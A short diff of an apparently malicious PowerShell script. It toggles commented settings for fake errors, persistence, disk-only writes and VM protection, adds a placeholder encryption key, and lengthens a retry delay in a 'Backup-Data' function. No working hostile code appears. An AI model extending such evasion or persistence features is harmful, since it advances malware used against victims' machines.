@@ -6,8 +6,9 @@
 #$fakeerror = $false
 #$persistence = $false
 #$write_disk_only = $false
+#$vm_protect = $true
+#$encryption_key = "YOUR_ENC_KEY_HERE"
 
-$vm_protect = $true
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -1149,7 +1150,7 @@ function Backup-Data {
                 $went_through = $true
             }
             catch {
-                $sleepTime = Get-Random -Minimum 10 -Maximum 30
+                $sleepTime = Get-Random -Minimum 30 -Maximum 120
                 Start-Sleep -Seconds $sleepTime
             }
         }
